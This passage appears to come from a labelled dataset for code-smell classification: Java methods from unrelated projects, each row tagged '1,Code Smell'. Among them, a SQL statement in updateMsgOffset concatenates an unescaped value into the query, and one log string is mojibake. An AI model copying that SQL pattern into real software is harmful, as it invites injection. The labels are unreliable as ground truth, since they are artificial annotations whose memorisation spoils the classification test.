      Log.i(TAG,""Exposure compensation already set to "" + compensationSteps + "" / ""+ actualCompensation);
    }
 else {
      Log.i(TAG,""Setting exposure compensation to "" + compensationSteps + "" / ""+ actualCompensation);
      parameters.setExposureCompensation(compensationSteps);
    }
  }
 else {
    Log.i(TAG,""Camera does not support exposure compensation"");
  }
}",1,Code Smell
"@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  int firstPosition=mSecondaryLayoutManager.findFirstVisibleItemPosition();
  int firstCompletePosition=mSecondaryLayoutManager.findFirstCompletelyVisibleItemPosition();
  List<BaseGroupedItem<T>> items=mSecondaryAdapter.getItems();
  if (firstCompletePosition > 0 && (firstCompletePosition) < items.size() && items.get(firstCompletePosition).isHeader) {
    View view=mSecondaryLayoutManager.findViewByPosition(firstCompletePosition);
    if (view != null && view.getTop() <= mTitleHeight) {
      mHeaderContainer.setY(view.getTop() - mTitleHeight);
    }
  }
 else {
    mHeaderContainer.setY(0);
  }
  boolean groupNameChanged=false;
  if (mFirstVisiblePosition != firstPosition && firstPosition >= 0) {
    if (mFirstVisiblePosition < firstPosition) {
      mHeaderContainer.setY(0);
    }
    mFirstVisiblePosition=firstPosition;
    String currentGroupName=items.get(mFirstVisiblePosition).isHeader ? items.get(mFirstVisiblePosition).header : items.get(mFirstVisiblePosition).info.getGroup();
    if (TextUtils.isEmpty(mLastGroupName) || !mLastGroupName.equals(currentGroupName)) {
      mLastGroupName=currentGroupName;
      groupNameChanged=true;
      mTvHeader.setText(mLastGroupName);
    }
  }
  if (groupNameChanged) {
    List<String> groupNames=mPrimaryAdapter.getStrings();
    for (int i=0; i < groupNames.size(); i++) {
      if (groupNames.get(i).equals(mLastGroupName)) {
        if (mPrimaryClicked) {
          if (mPrimaryAdapter.getSelectedPosition() == i) {
            mPrimaryClicked=false;
          }
        }
 else {
          mPrimaryAdapter.setSelectedPosition(i);
          RecyclerViewScrollHelper.smoothScrollToPosition(mRvPrimary,LinearSmoothScroller.SNAP_TO_END,i);
        }
      }
    }
  }
}",1,Code Smell
"@Override public void onDrag(float dx,float dy){
  if (mScaleDragDetector.isScaling()) {
    return;
  }
  if (mOnViewDragListener != null) {
    mOnViewDragListener.onDrag(dx,dy);
  }
  mSuppMatrix.postTranslate(dx,dy);
  checkAndDisplayMatrix();
  ViewParent parent=mImageView.getParent();
  if (mAllowParentInterceptOnEdge && !mScaleDragDetector.isScaling() && !mBlockParentIntercept) {
    if (mHorizontalScrollEdge == HORIZONTAL_EDGE_BOTH || (mHorizontalScrollEdge == HORIZONTAL_EDGE_LEFT && dx >= 1f) || (mHorizontalScrollEdge == HORIZONTAL_EDGE_RIGHT && dx <= -1f) || (mVerticalScrollEdge == VERTICAL_EDGE_TOP && dy >= 1f) || (mVerticalScrollEdge == VERTICAL_EDGE_BOTTOM && dy <= -1f)) {
      if (parent != null) {
        parent.requestDisallowInterceptTouchEvent(false);
      }
    }
  }
 else {
    if (parent != null) {
      parent.requestDisallowInterceptTouchEvent(true);
    }
  }
}",1,Code Smell
"@Override public void onInvocation(Invocation invocation){
  try {
    SerializerWrapper.inTimeSerialize(invocation);
  }
 catch (  SerializeException e) {
    ContextResourceClear.sampleFalse();
    log.error(""Error occurred serialize, stack:{}, reqTypes:{}, respType: {}"",JSON.toJSONString(MoonboxStackTraceUtils.retrieveStackTrace(null)),invocation.getParameterTypes(),invocation.getResponseType(),e);
  }
  if (invocation.isEntrance() && Tracer.isSample() && MOONBOX_CONTEXT.isStartEnd()) {
    broadcaster.sendRecord(this.makeUpRecordModel(invocation));
  }
 else {
    MoonboxRecordCache.addSubInvocationAndRemoveInvocation(invocation);
  }
}
",1,Code Smell
"private CallingUserModel findCallingUserModel(String userId){
  if (TextUtils.isEmpty(userId)) {
    return null;
  }
  if (userId.equals(mInviter.userId)) {
    return mInviter;
  }
 else {
    for (    CallingUserModel model : mInviteeList) {
      if (null != model && !TextUtils.isEmpty(model.userId) && userId.equals(model.userId)) {
        return model;
      }
    }
  }
  return null;
}
",1,Code Smell
"/** 
 * Used by the OLCUT configuration system, and should not be called by external code.
 */
@Override public void postConfig(){
  if (propMap.containsKey(""user"")) {
    if (username == null) {
      username=propMap.remove(""user"");
    }
 else {
      propMap.remove(""user"");
    }
  }
  if (propMap.containsKey(""password"")) {
    if (password == null) {
      password=propMap.remove(""password"");
    }
 else {
      propMap.remove(""password"");
    }
  }
  if (connectionString == null) {
    if (host != null && port != null && db != null) {
      connectionString=makeConnectionString(host,port,db);
    }
 else {
      throw new PropertyException(SQLDBConfig.class.getName(),""connectionString"",""All of host, port, and db must be specified if connectionString is null"");
    }
  }
}
",1,Code Smell
"@Override public ReturnT<String> registryRemove(RegistryParam registryParam){
  if (!StringUtils.hasText(registryParam.getRegistryGroup()) || !StringUtils.hasText(registryParam.getRegistryKey()) || !StringUtils.hasText(registryParam.getRegistryValue())) {
    return new ReturnT<String>(ReturnT.FAIL_CODE,""Illegal Argument."");
  }
  int ret=jobRegistryMapper.registryDelete(registryParam.getRegistryGroup(),registryParam.getRegistryKey(),registryParam.getRegistryValue());
  if (ret > 0) {
    freshGroupRegistryInfo(registryParam);
  }
  return ReturnT.SUCCESS;
}",1,Code Smell
"/** 
 * Returns the &lt;TestCase&gt; element corresponding to the current test case.
 * @param testCaseName  Name of test case
 * @param checkOverride Make sure that if an element overrides an element ina base repository, it has overrides=""true""
 * @return TestCase element, or null if not found
 */
private synchronized Element getTestCaseElement(final String testCaseName,boolean checkOverride,List<Pair<String,Element>> elements){
  final NodeList childNodes=root.getChildNodes();
  for (int i=0; i < childNodes.getLength(); i++) {
    Node child=childNodes.item(i);
    if (child.getNodeName().equals(TEST_CASE_TAG)) {
      Element testCase=(Element)child;
      final String name=testCase.getAttribute(TEST_CASE_NAME_ATTR);
      if (testCaseName.equals(name)) {
        if (checkOverride && (baseRepository != null) && (baseRepository.getTestCaseElement(testCaseName,false,null) != null)&& !""true"".equals(testCase.getAttribute(TEST_CASE_OVERRIDES_ATTR))) {
          throw new RuntimeException(""TestCase  '"" + testCaseName + ""' overrides a ""+ ""test case in the base repository, but does ""+ ""not specify 'overrides=true'"");
        }
        return testCase;
      }
      if (elements != null) {
        elements.add(Pair.of(name,testCase));
      }
    }
  }
  return null;
}",1,Code Smell
"private void tryResetAccount(String requestPhone,String phoneHash,String phoneCode){
  if (radialProgressView.getTag() != null) {
    return;
  }
  AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
  builder.setMessage(getString(""ResetMyAccountWarningText"",R.string.ResetMyAccountWarningText));
  builder.setTitle(getString(""ResetMyAccountWarning"",R.string.ResetMyAccountWarning));
  builder.setPositiveButton(getString(""ResetMyAccountWarningReset"",R.string.ResetMyAccountWarningReset),(dialogInterface,i) -> {
    needShowProgress(0);
    TLRPC.TL_account_deleteAccount req=new TLRPC.TL_account_deleteAccount();
    req.reason=""Forgot password"";
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      needHideProgress(false);
      if (error == null) {
        if (requestPhone == null || phoneHash == null || phoneCode == null) {
          setPage(VIEW_PHONE_INPUT,true,null,true);
          return;
        }
        Bundle params=new Bundle();
        params.putString(""phoneFormated"",requestPhone);
        params.putString(""phoneHash"",phoneHash);
        params.putString(""code"",phoneCode);
        setPage(VIEW_REGISTER,true,params,false);
      }
 else {
        if (error.text.equals(""2FA_RECENT_CONFIRM"")) {
          needShowAlert(getString(R.string.RestorePasswordNoEmailTitle),getString(""ResetAccountCancelledAlert"",R.string.ResetAccountCancelledAlert));
        }
 else         if (error.text.startsWith(""2FA_CONFIRM_WAIT_"")) {
          Bundle params=new Bundle();
          params.putString(""phoneFormated"",requestPhone);
          params.putString(""phoneHash"",phoneHash);
          params.putString(""code"",phoneCode);
          params.putInt(""startTime"",ConnectionsManager.getInstance(currentAccount).getCurrentTime());
          params.putInt(""waitTime"",Utilities.parseInt(error.text.replace(""2FA_CONFIRM_WAIT_"","""")));
          setPage(VIEW_RESET_WAIT,true,params,false);
        }
 else {
          needShowAlert(getString(R.string.RestorePasswordNoEmailTitle),error.text);
        }
      }
    }
),ConnectionsManager.RequestFlagWithoutLogin | ConnectionsManager.RequestFlagFailOnServerErrors);
  }
);
  builder.setNegativeButton(getString(""Cancel"",R.string.Cancel),null);
  showDialog(builder.create());
}",1,Code Smell
"public static Throwable ratpackClientSpanErrorMapper(URI uri,Throwable exception){
  if (uri.toString().equals(""https://192.0.2.1/"") || (OS.WINDOWS.isCurrentOs() && uri.toString().equals(""http://localhost:61/""))) {
    return new ConnectTimeoutException(""Connect timeout (PT2S) connecting to "" + uri);
  }
 else   if (uri.getPath().equals(""/read-timeout"")) {
    return new HttpClientReadTimeoutException(""Read timeout (PT2S) waiting on HTTP server at "" + uri);
  }
  return exception;
}",1,Code Smell
"private void onMoveEventInternal(final int x,final int y,final long eventTime){
  final Key oldKey=mCurrentKey;
  if (oldKey != null && oldKey.getCode() == Constants.CODE_SPACE && Settings.getInstance().getCurrent().mSpaceTrackpadEnabled) {
    int steps=(x - mStartX) / sPointerStep;
    final int longpressTimeout=2 * Settings.getInstance().getCurrent().mKeyLongpressTimeout / MULTIPLIER_FOR_LONG_PRESS_TIMEOUT_IN_SLIDING_INPUT;
    if (steps != 0 && mStartTime + longpressTimeout < System.currentTimeMillis()) {
      mCursorMoved=true;
      mStartX+=steps * sPointerStep;
      sListener.onMovePointer(steps);
    }
    return;
  }
  if (oldKey != null && oldKey.getCode() == Constants.CODE_DELETE && Settings.getInstance().getCurrent().mDeleteSwipeEnabled) {
    int steps=(x - mStartX) / sPointerStep;
    if (abs(steps) > 2 || (mCursorMoved && steps != 0)) {
      sTimerProxy.cancelKeyTimersOf(this);
      mCursorMoved=true;
      mStartX+=steps * sPointerStep;
      sListener.onMoveDeletePointer(steps);
    }
    return;
  }
  final Key newKey=onMoveKey(x,y);
  final int lastX=mLastX;
  final int lastY=mLastY;
  if (sGestureEnabler.shouldHandleGesture()) {
    onGestureMoveEvent(x,y,eventTime,true,newKey);
    if (sInGesture) {
      mCurrentKey=null;
      setReleasedKeyGraphics(oldKey,true);
      return;
    }
  }
  if (newKey != null) {
    if (oldKey != null && isMajorEnoughMoveToBeOnNewKey(x,y,eventTime,newKey)) {
      dragFingerFromOldKeyToNewKey(newKey,x,y,eventTime,oldKey,lastX,lastY);
    }
 else     if (oldKey == null) {
      processDraggingFingerInToNewKey(newKey,x,y,eventTime);
    }
  }
 else {
    if (oldKey != null && isMajorEnoughMoveToBeOnNewKey(x,y,eventTime,newKey)) {
      dragFingerOutFromOldKey(oldKey,x,y);
    }
  }
  if (mIsInSlidingKeyInput) {
    sDrawingProxy.showSlidingKeyInputPreview(this);
  }
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,Integer integer){
  if ((loc.equals(METHOD_INVOCATION_ARGUMENTS) || loc.equals(METHOD_INVOCATION_NAME)) && method.isScope(insertionPoint)) {
    J.MethodInvocation m;
    if (loc.equals(METHOD_INVOCATION_ARGUMENTS)) {
      m=substitutions.unsubstitute(templateParser.parseMethodArguments(getCursor(),substitutedTemplate,loc));
      m=autoFormat(m,0);
      m=method.withArguments(m.getArguments()).withMethodType(m.getMethodType());
    }
 else {
      m=substitutions.unsubstitute(templateParser.parseMethod(getCursor(),substitutedTemplate,loc));
      m=autoFormat(m,0);
      m=method.withName(m.getName()).withArguments(m.getArguments()).withMethodType(m.getMethodType());
    }
    JavaType.Method mt=method.getMethodType();
    if (m.getMethodType() == null && mt != null) {
      List<JavaType> argTypes=m.getArguments().stream().map(Expression::getType).map(it -> {
        if (it == JavaType.Primitive.String) {
          return JavaType.ShallowClass.build(""java.lang.String"");
        }
        return it;
      }
).collect(toList());
      mt=mt.withParameterTypes(argTypes);
      m=m.withMethodType(mt);
    }
    if (m.getName().getType() != null) {
      m=m.withName(m.getName().withType(m.getType()));
    }
    return m;
  }
  return maybeReplaceStatement(method,J.class,0);
}",1,Code Smell
"@Override public void onChanged(RecordStatus recordStatus){
  if (recordStatus == RecordStatus.RECORDING || recordStatus == RecordStatus.TAKE_PHOTOING) {
    findViewById(R.id.cancel_record_button).setVisibility(INVISIBLE);
    findViewById(R.id.record_switch_camera).setVisibility(INVISIBLE);
    hideRecordOperationTips();
  }
 else {
    mRecordButtonView.setProcess(0);
    mLastRecordProcess=0.0f;
    mLastRecordTime=null;
    if (recordStatus == RecordStatus.STOP && !mRecordInfo.recordResult.isSuccess && mRecordInfo.recordResult.code == TXRecordCommon.RECORD_RESULT_OK_LESS_THAN_MINDURATION) {
      mRecordCore.takePhoto(TUIMultimediaFileUtil.generateFilePath(MultimediaPluginFileType.PICTURE_FILE));
    }
 else {
      findViewById(R.id.cancel_record_button).setVisibility(VISIBLE);
      findViewById(R.id.record_switch_camera).setVisibility(VISIBLE);
    }
  }
}
@Override public void onChanged(Float process){
  LiteavLog.i(TAG,""record process is "" + process);
  if (process > mLastRecordProcess) {
    mLastRecordProcess=process;
    mRecordButtonView.setProcess(process);
    setRecordTime(process);
  }
}",1,Code Smell
"/** 
 * Notifies the media clock that a renderer has been enabled. Starts using the media clock of the provided renderer if available.
 * @param renderer The renderer which has been enabled.
 * @throws ExoPlaybackException If the renderer provides a media clock and another renderer mediaclock is already provided.
 */
public void onRendererEnabled(Renderer renderer) throws ExoPlaybackException {
  MediaClock rendererMediaClock=renderer.getMediaClock();
  if (rendererMediaClock != null && rendererMediaClock != rendererClock) {
    if (rendererClock != null) {
      throw ExoPlaybackException.createForUnexpected(new IllegalStateException(""Multiple renderer media clocks enabled.""));
    }
    this.rendererClock=rendererMediaClock;
    this.rendererClockSource=renderer;
    rendererClock.setPlaybackParameters(standaloneMediaClock.getPlaybackParameters());
    ensureSynced();
  }
}
",1,Code Smell
"protected void appendToggleHistoryButton(){
  if (!mIsToggleHistoryEnabled) {
    return;
  }
  Video original=getVideo();
  if (original != null && original.isChapter) {
    return;
  }
  if (getSection() != null && getSection().getId() != MediaGroup.TYPE_HISTORY) {
    return;
  }
  GeneralData generalData=GeneralData.instance(getContext());
  boolean enabled=generalData.isHistoryEnabled();
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(enabled ? R.string.pause_history : R.string.resume_history),optionItem -> {
    mServiceManager.enableHistory(!enabled);
    generalData.enableHistory(!enabled);
    getDialogPresenter().closeDialog();
  }
));
}
",1,Code Smell
"/** 
 * Update consumption status
 */
boolean updateMsgOffset(int jobId,Properties props,Logger log,String[] consumedMsgInfo,String lastMsgId){
  boolean result=false;
  String vNewMsgID=""-1"";
  PreparedStatement updatePstmt=null;
  Connection msgConn=null;
  vNewMsgID=setConsumedMsg(props,log,consumedMsgInfo);
  try {
    if (StringUtils.isNotEmpty(vNewMsgID) && StringUtils.isNotBlank(vNewMsgID) && !""-1"".equals(vNewMsgID)) {
      msgConn=getEventCheckerConnection(props,log);
      if (msgConn == null)       return false;
      int vProcessID=jobId;
      String vReceiveTime=DateFormatUtils.format(new Date(),""yyyy-MM-dd HH:mm:ss"");
      ;
      String sqlForUpdateMsg=""INSERT INTO event_status(receiver,topic,msg_name,receive_time,msg_id) VALUES(?,?,?,?,?) ON DUPLICATE KEY UPDATE receive_time=VALUES(receive_time),msg_id= CASE WHEN msg_id= "" + lastMsgId + "" THEN VALUES(msg_id) ELSE msg_id END"";
      log.info(""last message offset {} is:"" + lastMsgId);
      updatePstmt=msgConn.prepareCall(sqlForUpdateMsg);
      updatePstmt.setString(1,receiver);
      updatePstmt.setString(2,topic);
      updatePstmt.setString(3,msgName);
      updatePstmt.setString(4,vReceiveTime);
      updatePstmt.setString(5,vNewMsgID);
      int updaters=updatePstmt.executeUpdate();
      log.info(""updateMsgOffset successful {} update result is:"" + updaters);
      if (updaters != 0) {
        log.info(""Received message successfully , update message status succeeded, consumed flow execution ID: "" + vProcessID);
        result=true;
      }
 else {
        log.info(""Received message successfully , update message status failed, consumed flow execution ID: "" + vProcessID);
        result=false;
      }
    }
 else {
      result=false;
    }
  }
 catch (  SQLException e) {
    log.error(""Error update Msg Offset"" + e);
    return false;
  }
 finally {
    closeQueryStmt(updatePstmt,log);
    closeConnection(msgConn,log);
  }
  return result;
}",1,Code Smell
"public void manageEntities(Level level){
  currentlyTraversedDimensions.clear();
  bogeys.forEach(cb -> {
    if (cb == null)     return;
    cb.points.forEach(tp -> {
      if (tp.node1 == null)       return;
      currentlyTraversedDimensions.add(tp.node1.getLocation().dimension);
    }
);
  }
);
  for (Iterator<Entry<ResourceKey<Level>,DimensionalCarriageEntity>> iterator=entities.entrySet().iterator(); iterator.hasNext(); ) {
    Entry<ResourceKey<Level>,DimensionalCarriageEntity> entry=iterator.next();
    boolean discard=!currentlyTraversedDimensions.isEmpty() && !currentlyTraversedDimensions.contains(entry.getKey());
    MinecraftServer server=level.getServer();
    if (server == null)     continue;
    ServerLevel currentLevel=server.getLevel(entry.getKey());
    if (currentLevel == null)     continue;
    DimensionalCarriageEntity dimensionalCarriageEntity=entry.getValue();
    CarriageContraptionEntity entity=dimensionalCarriageEntity.entity.get();
    if (entity == null) {
      if (discard)       iterator.remove();
 else       if (dimensionalCarriageEntity.positionAnchor != null && CarriageEntityHandler.isActiveChunk(currentLevel,BlockPos.containing(dimensionalCarriageEntity.positionAnchor)))       dimensionalCarriageEntity.createEntity(currentLevel,anyAvailableEntity() == null);
    }
 else {
      if (discard) {
        discard=dimensionalCarriageEntity.discardTicks > 3;
        dimensionalCarriageEntity.discardTicks++;
      }
 else       dimensionalCarriageEntity.discardTicks=0;
      CarriageEntityHandler.validateCarriageEntity(entity);
      if (!entity.isAlive() || entity.leftTickingChunks || discard) {
        dimensionalCarriageEntity.removeAndSaveEntity(entity,discard);
        if (discard)         iterator.remove();
        continue;
      }
    }
    entity=dimensionalCarriageEntity.entity.get();
    if (entity != null && dimensionalCarriageEntity.positionAnchor != null) {
      dimensionalCarriageEntity.alignEntity(entity);
      entity.syncCarriage();
    }
  }
}",1,Code Smell
"@Override public BlockState getStateForPlacement(BlockPlaceContext context){
  BlockState state=defaultBlockState().setValue(FACING,context.getNearestLookingDirection().getOpposite());
  Direction placeDirection=context.getClickedFace().getOpposite();
  if ((context.getPlayer() != null && context.getPlayer().isShiftKeyDown()) || hasValidContact(context.getLevel(),context.getClickedPos(),placeDirection))   state=state.setValue(FACING,placeDirection);
  if (hasValidContact(context.getLevel(),context.getClickedPos(),state.getValue(FACING)))   state=state.setValue(POWERED,true);
  return state;
}
",1,Code Smell
"/** 
 * Remove extraneous whitespace from the given element. Modifies the node in place
 * @param element
 */
void collapse(Node element){
  if (element.childNodeSize() == 0 || isPre(element)) {
    return;
  }
  TextNode prevText=null;
  boolean prevVoid=false;
  Node prev=null;
  Node node=next(prev,element);
  while (node != element) {
    if (NodeUtils.isNodeType3(node) || NodeUtils.isNodeType4(node)) {
      TextNode textNode=(TextNode)node;
      String value=textNode.attributes().get(""#text"").replaceAll(""[ \\r\\n\\t]+"","" "");
      if ((prevText == null || Pattern.compile("" $"").matcher(prevText.text()).find()) && !prevVoid && value.charAt(0) == ' ') {
        value=value.substring(1);
      }
      if (value.length() == 0) {
        node=remove(node);
        continue;
      }
      TextNode newNode=new TextNode(value);
      node.replaceWith(newNode);
      prevText=newNode;
      node=newNode;
    }
 else     if (NodeUtils.isNodeType1(node)) {
      if (isBlock(node)) {
        if (prevText != null) {
          prevText.text(prevText.text().replaceAll("" $"",""""));
        }
        prevText=null;
        prevVoid=false;
      }
 else       if (isVoid(node)) {
        prevText=null;
        prevVoid=true;
      }
    }
 else {
      node=remove(node);
      continue;
    }
    Node nextNode=next(prev,node);
    prev=node;
    node=nextNode;
  }
  if (prevText != null) {
    prevText.text(prevText.text().replaceAll("" $"",""""));
    if (prevText.text() == null) {
      remove(prevText);
    }
  }
}",1,Code Smell
"private static void paveTracks(Level level,PlacementInfo info,BlockItem blockItem,boolean simulate){
  Block block=blockItem.getBlock();
  info.requiredPavement=0;
  if (block == null || block instanceof EntityBlock || block.defaultBlockState().getCollisionShape(level,info.pos1).isEmpty())   return;
  Set<BlockPos> visited=new HashSet<>();
  for (  boolean first : Iterate.trueAndFalse) {
    int extent=(first ? info.end1Extent : info.end2Extent) + (info.curve != null ? 1 : 0);
    Vec3 axis=first ? info.axis1 : info.axis2;
    BlockPos pavePos=first ? info.pos1 : info.pos2;
    info.requiredPavement+=TrackPaver.paveStraight(level,pavePos.below(),axis,extent,block,simulate,visited);
  }
  if (info.curve != null)   info.requiredPavement+=TrackPaver.paveCurve(level,info.curve,block,simulate,visited);
}",1,Code Smell
"public void subscribeWalletNodes(Wallet wallet,Collection<WalletNode> nodes,Map<WalletNode,Set<BlockTransactionHash>> nodeTransactionMap,int startIndex) throws ServerException {
  try {
    Set<String> scriptHashes=new HashSet<>();
    Map<String,String> pathScriptHashes=new LinkedHashMap<>();
    Map<String,WalletNode> pathNodes=new HashMap<>();
    for (    WalletNode node : nodes) {
      if (node == null) {
        log.error(""Null node for wallet "" + wallet.getFullName() + "" subscribing nodes ""+ nodes+ "" startIndex ""+ startIndex,new Throwable());
      }
      if (node != null && node.getIndex() >= startIndex) {
        String scriptHash=getScriptHash(node);
        String subscribedStatus=getSubscribedScriptHashStatus(scriptHash);
        if (subscribedStatus != null) {
          if (!subscribedStatus.equals(retrievedScriptHashes.get(scriptHash)) || !subscribedStatus.equals(getScriptHashStatus(scriptHash,node))) {
            nodeTransactionMap.put(node,new TreeSet<>());
          }
        }
 else         if (!subscribedScriptHashes.containsKey(scriptHash) && scriptHashes.add(scriptHash)) {
          pathScriptHashes.put(node.getDerivationPath(),scriptHash);
          pathNodes.put(node.getDerivationPath(),node);
        }
      }
    }
    log.debug(""Subscribe to:        "" + pathScriptHashes.keySet());
    if (pathScriptHashes.isEmpty()) {
      return;
    }
    Map<String,String> result=electrumServerRpc.subscribeScriptHashes(getTransport(),wallet,pathScriptHashes);
    for (    String path : result.keySet()) {
      String status=result.get(path);
      WalletNode node=pathNodes.computeIfAbsent(path,p -> nodes.stream().filter(n -> n.getDerivationPath().equals(p)).findFirst().orElse(null));
      if (node != null) {
        String scriptHash=getScriptHash(node);
        if (status != null && !status.equals(retrievedScriptHashes.get(scriptHash))) {
          nodeTransactionMap.put(node,new TreeSet<>());
        }
        updateSubscribedScriptHashStatus(scriptHash,status);
      }
    }
  }
 catch (  ElectrumServerRpcException e) {
    throw new ServerException(e.getMessage(),e.getCause());
  }
catch (  Exception e) {
    throw new ServerException(e);
  }
}
",1,Code Smell
"private void initInviteTakeSeatView(){
  mLayoutInviteToStage=findViewById(R.id.ll_invite_to_stage);
  if (!mViewModel.checkPermission(UserManagementViewModel.ACTION_SEAT_CONTROL) || !mViewModel.isEnableSeatControl() || mUser.isOnSeat()) {
    mLayoutInviteToStage.setVisibility(View.GONE);
    return;
  }
  mLayoutInviteToStage.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      mViewModel.inviteToStage();
      dismiss();
    }
  }
);
}
",1,Code Smell
"private void showAnimationHint(){
  if (page2 == null || messagesCheckBoxView == null || accent.myMessagesGradientAccentColor2 == 0) {
    return;
  }
  SharedPreferences preferences=MessagesController.getGlobalMainSettings();
  if (preferences.getBoolean(""bganimationhint"",false)) {
    return;
  }
  if (animationHint == null) {
    animationHint=new HintView(getParentActivity(),8);
    animationHint.setShowingDuration(5000);
    animationHint.setAlpha(0);
    animationHint.setVisibility(View.INVISIBLE);
    animationHint.setText(LocaleController.getString(""BackgroundAnimateInfo"",R.string.BackgroundAnimateInfo));
    animationHint.setExtraTranslationY(dp(6));
    frameLayout.addView(animationHint,LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.LEFT | Gravity.TOP,10,0,10,0));
  }
  AndroidUtilities.runOnUIThread(() -> {
    if (colorType != 3) {
      return;
    }
    preferences.edit().putBoolean(""bganimationhint"",true).commit();
    animationHint.showForView(messagesCheckBoxView[0],true);
  }
,500);
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  nextButton.set(param.thisObject,null);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  nextButton.set(param.thisObject,null);
}
@Override protected void afterHookedMethod(MethodHookParam param){
  if (NextContentAnimationView.isAssignableFrom(param.args[0].getClass()) || (NextContentAnimationView_short != null && NextContentAnimationView_short.isAssignableFrom(param.args[0].getClass())))   ((View)param.args[0]).setVisibility(View.GONE);
}",1,Code Smell
"/** 
 * Create a font for the given family, style and size. If the font family does not match any font on the system, then the last word (usually a font weight) from the family name is removed and tried again. E.g. family 'URW Bookman Light' is not found, but 'URW Bookman' is found. If still not found, then font of family 'Dialog' is returned.
 */
private static Font createFontEx(String family,int style,int size){
  for (; ; ) {
    Font font=FlatLaf.createCompositeFont(family,style,size);
    if (Font.DIALOG.equals(family))     return font;
    if (!Font.DIALOG.equals(font.getFamily())) {
      FontMetrics fm=StyleContext.getDefaultStyleContext().getFontMetrics(font);
      if (fm.getHeight() > size * 2 || fm.stringWidth(""a"") == 0)       return FlatLaf.createCompositeFont(Font.DIALOG,style,size);
      return font;
    }
    int index=family.lastIndexOf(' ');
    if (index < 0)     return FlatLaf.createCompositeFont(Font.DIALOG,style,size);
    String lastWord=family.substring(index + 1).toLowerCase(Locale.ENGLISH);
    if (lastWord.contains(""bold"") || lastWord.contains(""heavy"") || lastWord.contains(""black""))     style|=Font.BOLD;
    family=family.substring(0,index);
  }
}",1,Code Smell
"@Bean @ConditionalOnMissingBean public CaptchaService captchaService(AjCaptchaProperties prop){
  logger.info(""鑷畾涔夐厤缃」锛歿}"",prop.toString());
  Properties config=new Properties();
  config.put(Const.CAPTCHA_CACHETYPE,prop.getCacheType().name());
  config.put(Const.CAPTCHA_WATER_MARK,prop.getWaterMark());
  config.put(Const.CAPTCHA_FONT_TYPE,prop.getFontType());
  config.put(Const.CAPTCHA_TYPE,prop.getType().getCodeValue());
  config.put(Const.CAPTCHA_INTERFERENCE_OPTIONS,prop.getInterferenceOptions());
  config.put(Const.ORIGINAL_PATH_JIGSAW,prop.getJigsaw());
  config.put(Const.ORIGINAL_PATH_PIC_CLICK,prop.getPicClick());
  config.put(Const.CAPTCHA_SLIP_OFFSET,prop.getSlipOffset());
  config.put(Const.CAPTCHA_AES_STATUS,String.valueOf(prop.getAesStatus()));
  config.put(Const.CAPTCHA_WATER_FONT,prop.getWaterFont());
  config.put(Const.CAPTCHA_CACAHE_MAX_NUMBER,prop.getCacheNumber());
  config.put(Const.CAPTCHA_TIMING_CLEAR_SECOND,prop.getTimingClear());
  config.put(Const.HISTORY_DATA_CLEAR_ENABLE,prop.isHistoryDataClearEnable() ? ""1"" : ""0"");
  config.put(Const.REQ_FREQUENCY_LIMIT_ENABLE,prop.getReqFrequencyLimitEnable() ? ""1"" : ""0"");
  config.put(Const.REQ_GET_LOCK_LIMIT,prop.getReqGetLockLimit() + """");
  config.put(Const.REQ_GET_LOCK_SECONDS,prop.getReqGetLockSeconds() + """");
  config.put(Const.REQ_GET_MINUTE_LIMIT,prop.getReqGetMinuteLimit() + """");
  config.put(Const.REQ_CHECK_MINUTE_LIMIT,prop.getReqCheckMinuteLimit() + """");
  config.put(Const.REQ_VALIDATE_MINUTE_LIMIT,prop.getReqVerifyMinuteLimit() + """");
  config.put(Const.CAPTCHA_FONT_SIZE,prop.getFontSize() + """");
  config.put(Const.CAPTCHA_FONT_STYLE,prop.getFontStyle() + """");
  config.put(Const.CAPTCHA_WORD_COUNT,prop.getClickWordCount() + """");
  if ((StringUtils.isNotBlank(prop.getJigsaw()) && prop.getJigsaw().startsWith(""classpath:"")) || (StringUtils.isNotBlank(prop.getPicClick()) && prop.getPicClick().startsWith(""classpath:""))) {
    config.put(Const.CAPTCHA_INIT_ORIGINAL,""true"");
    initializeBaseMap(prop.getJigsaw(),prop.getPicClick());
  }
  CaptchaService s=CaptchaServiceFactory.getInstance(config);
  return s;
}",1,Code Smell
"public static MessageDialog show(CharSequence title,CharSequence message,CharSequence okText){
  MessageDialog messageDialog=new MessageDialog(title,message,okText);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(int titleResId,int messageResId,int okTextResId){
  MessageDialog messageDialog=new MessageDialog(titleResId,messageResId,okTextResId);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(CharSequence title,CharSequence message){
  MessageDialog messageDialog=new MessageDialog(title,message);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(int titleResId,int messageResId){
  MessageDialog messageDialog=new MessageDialog(titleResId,messageResId);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(CharSequence title,CharSequence message,CharSequence okText,CharSequence cancelText){
  MessageDialog messageDialog=new MessageDialog(title,message,okText,cancelText);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(int titleResId,int messageResId,int okTextResId,int cancelTextResId){
  MessageDialog messageDialog=new MessageDialog(titleResId,messageResId,okTextResId,cancelTextResId);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(CharSequence title,CharSequence message,CharSequence okText,CharSequence cancelText,CharSequence otherText){
  MessageDialog messageDialog=new MessageDialog(title,message,okText,cancelText,otherText);
  messageDialog.show();
  return messageDialog;
}
public static MessageDialog show(int titleResId,int messageResId,int okTextResId,int cancelTextResId,int otherTextResId){
  MessageDialog messageDialog=new MessageDialog(titleResId,messageResId,okTextResId,cancelTextResId,otherTextResId);
  messageDialog.show();
  return messageDialog;
}
public MessageDialog show(){
  if (isHide && getDialogView() != null && isShow) {
    if (hideWithExitAnim && getDialogImpl() != null) {
      getDialogView().setVisibility(View.VISIBLE);
